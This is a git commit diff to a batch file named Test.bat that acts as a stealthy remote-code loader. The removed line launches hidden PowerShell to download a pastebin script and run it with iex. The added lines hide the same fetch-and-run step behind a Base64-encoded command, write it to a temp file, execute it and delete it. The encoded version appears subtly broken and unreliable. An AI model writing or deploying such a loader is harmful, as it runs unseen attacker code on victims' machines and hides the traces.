3d24d0818cf4fd9bf5d80d4107ca51e80a48d26c
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2024-12-19 15:58:16 +0200

    Update Test.bat

--- Test.bat
+++ Test.bat
@@ -1,3 +1,13 @@
 @echo off
-start "" /b powershell -WindowStyle Hidden -Command "irm 'https://pastebin.com/raw/wv1HvG4T' | iex"
+setlocal enabledelayedexpansion
+
+:: Base64-encoded payload (encrypted command)
+set "encoded_command=aQBlAG0AIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwByAGEAdwAvAHcAdgAxAEgAdgBHNABUAA=="
+
+:: Decode the Base64 command and execute it
+echo !encoded_command! | powershell -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content -)))" > temp.bat
+call temp.bat
+
+:: Clean up
+del temp.bat
 exit
